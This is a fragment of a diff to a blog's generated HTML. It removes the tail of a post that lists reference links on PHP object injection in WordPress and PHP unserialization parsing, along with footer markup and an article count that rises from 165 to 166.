-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;"><a href="http://vagosec.org/2013/09/wordpress-php-object-injection/" target="_blank" rel="noopener">http://vagosec.org/2013/09/wordpress-php-object-injection/</a>&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">《var_unserializer.c源码》&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;"><a href="https://github.com/php/php-src/blob/73cd2e0ab14d804c6bf0b689490bdd4fd6e969b1/ext/standard/var_unserializer.c" target="_blank" rel="noopener">https://github.com/php/php-src/blob/73cd2e0ab14d804c6bf0b689490bdd4fd6e969b1/ext/standard/var_unserializer.c</a>&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">《PHP string序列化与反序列化语法解析不一致带来的安全隐患》&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;"><a href="http://zone.wooyun.org/content/1664" target="_blank" rel="noopener">http://zone.wooyun.org/content/1664</a></span></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1990,7 +1926,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-count">166</span>
                   <span class="site-state-item-name">Artikel</span>
                 </a>
               </div>
